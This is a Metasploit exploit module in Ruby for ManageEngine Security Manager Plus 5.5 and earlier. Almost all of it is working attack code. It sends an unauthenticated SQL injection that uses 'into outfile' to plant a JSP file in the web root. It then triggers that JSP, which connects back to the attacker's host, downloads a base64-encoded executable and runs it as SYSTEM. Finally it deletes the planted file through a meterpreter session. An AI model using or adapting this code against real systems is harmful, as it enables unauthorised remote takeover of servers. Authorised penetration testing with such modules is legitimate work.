##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::TcpServer
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "ManageEngine Security Manager Plus <=5.5 build 5505 remote code execution",
            'Description'    => %q{
                    This module exploits a SQL injection found in ManageEngine Security Manager Plus 
                advanced search page.  It will send a malicious SQL query to create a JSP file
                under the web root directory, and then let it download and execute our malicious
                executable under the context of SYSTEM. No authentication is necessary to exploit this.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'xistence'  # Discovery & Metasploit module
                ],
            'References'     =>
                [
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00",
                },
            'DefaultOptions'  =>
                {
                    'ExitFunction' => "none"
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # Win XP / 2003 / Vista / Win 7 / etc
                    ['Windows Universal', {}]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Oct 18 2012",
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptPort.new('RPORT', [true, 'The target port', 6262]),
            ], self.class)
    end
 
 
    #
    # A very gentle check to see if Security Manager Plus exists or not
    #
    def check
        res = send_request_raw({
            'method' => 'GET',
            'uri'    => '/SecurityManager.cc'
        })
 
        if res and res.body =~ /\<title\>Security Manager Plus\<\/title\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    #
    # Remove the JSP once we get a shell.
    # We cannot delete the executable because it will still be in use.
    #
    def on_new_session(cli)
        if cli.type != 'meterpreter'
            print_error("Meterpreter not used. Please manually remove #{@jsp_name + '.jsp'}")
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
    #        jsp = @outpath.gsub(/\//, "\\\\")
    #        jsp = jsp.gsub(/"/, "")
            vprint_status("#{rhost}:#{rport} - Deleting: #{@jsp_name + '.jsp'}")
            cli.fs.file.rm("../webapps/SecurityManager/#{@jsp_name + '.jsp'}")
            print_status("#{rhost}:#{rport} - #{@jsp_name + '.jsp'} deleted")
        rescue ::Exception => e
            print_error("Unable to delete #{@jsp_name + '.jsp'}: #{e.message}")
        end
    end
 
 
    #
    # Transfer the malicious executable to our victim
    #
    def on_client_connect(cli)
        print_status("#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@native_payload.length} bytes)")
        cli.put(@native_payload)
        service.close_client(cli)
    end
 
 
    #
    # Generate a download+exe JSP payload
    #
    def generate_jsp_payload
        my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address("50.50.50.50") : datastore['SRVHOST']
        my_port = datastore['SRVPORT']
 
        # tmp folder = C:\Program Files\SolarWinds\Storage Manager Server\temp\
        # This will download our malicious executable in base64 format, decode it back,
        # save it as a temp file, and then finally execute it.
        jsp = %Q|
        <%@page import="java.io.*"%>
        <%@page import="java.net.*"%>
        <%@page import="sun.misc.BASE64Decoder"%>
 
        <%
        StringBuffer buf = new StringBuffer();
        byte[] shellcode = null;
        BufferedOutputStream outstream = null;
        try {
            Socket s = new Socket("#{my_host}", #{my_port});
            BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
            while (buf.length() < #{@native_payload.length}) {
                buf.append( (char) r.read());
            }
 
            BASE64Decoder decoder = new BASE64Decoder();
            shellcode = decoder.decodeBuffer(buf.toString());
 
            File temp = File.createTempFile("#{@native_payload_name}", ".exe");
            String path = temp.getAbsolutePath();
 
            outstream = new BufferedOutputStream(new FileOutputStream(path));
            outstream.write(shellcode);
            outstream.close();
 
            Process p = Runtime.getRuntime().exec(path);
        } catch (Exception e) {}
        %>
        |
 
        jsp = jsp.gsub(/\n/, '')
        jsp = jsp.gsub(/\t/, '')
 
        jsp.unpack("H*")[0]
    end
 
 
    #
    # Run the actual exploit
    #
    def inject_exec
        # This little lag is meant to ensure the TCP server runs first before the requests
        select(nil, nil, nil, 1)
 
        # Inject our JSP payload
        print_status("#{rhost}:#{rport} - Sending JSP payload")
        pass = rand_text_alpha(rand(10)+5)
        hex_jsp  = generate_jsp_payload
 
        res = send_request_cgi({
            'method'    => 'POST',
            'uri'       => '/STATE_ID/31337/jsp/xmlhttp/persistence.jsp?reqType=AdvanceSearch&SUBREQUEST=XMLHTTP',
            'headers'   => {
                'Cookie' => 'STATE_COOKIE=%26SecurityManager%2FID%2F174%2FHomePageSubDAC_LIST%2F223%2FSecurityManager_CONTENTAREA_LIST%2F226%2FMainDAC_LIST%2F166%26MainTabs%2FID%2F167%2F_PV%2F174%2FselectedView%2FHome%26Home%2FID%2F166%2FPDCA%2FMainDAC%2F_PV%2F174%26HomePageSub%2FID%2F226%2FPDCA%2FSecurityManager_CONTENTAREA%2F_PV%2F166%26HomePageSubTab%2FID%2F225%2F_PV%2F226%2FselectedView%2FHomePageSecurity%26HomePageSecurity%2FID%2F223%2FPDCA%2FHomePageSubDAC%2F_PV%2F226%26_REQS%2F_RVID%2FSecurityManager%2F_TIME%2F31337; 2RequestsshowThreadedReq=showThreadedReqshow; 2RequestshideThreadedReq=hideThreadedReqhide;',
                'Accept-Encoding' => 'identity'
            },
            'vars_post'  => {
                'ANDOR' => 'and',
                'condition_1' => 'OpenPorts@PORT',
                'operator_1' => 'IN',
                'value_1'  => "1)) union select 0x#{hex_jsp},2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,21,22,23,24,25,26,27,28,29 into outfile #{@outpath} FROM mysql.user WHERE 1=((1",
                'COUNT' => '1'
            }
        })
  
        print_status("#{rhost}:#{rport} - Sending pwnage /#{@jsp_name + '.jsp'}")
        res = send_request_raw({
            'method'  => 'GET',
            'uri'     => "/#{@jsp_name + '.jsp'}",
            'headers' => {
                'Cookie' => 'pwnage'
            }
        })
 
        handler
    end
 
 
    #
    # The server must start first, and then we send the malicious requests
    #
    def exploit
        # Avoid passing this as an argument for performance reasons
        # This is in base64 is make sure our file isn't mangled
        @native_payload      = [generate_payload_exe].pack("m*")
        @native_payload_name = rand_text_alpha(rand(6)+3)
        @jsp_name            = rand_text_alpha(rand(6)+3)
        @outpath             = "\"../../webapps/SecurityManager/#{@jsp_name + '.jsp'}\""

        begin
            t = framework.threads.spawn("reqs", false) { inject_exec }
            print_status("Serving executable on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
            super
        ensure
            t.kill
        end
    end
end
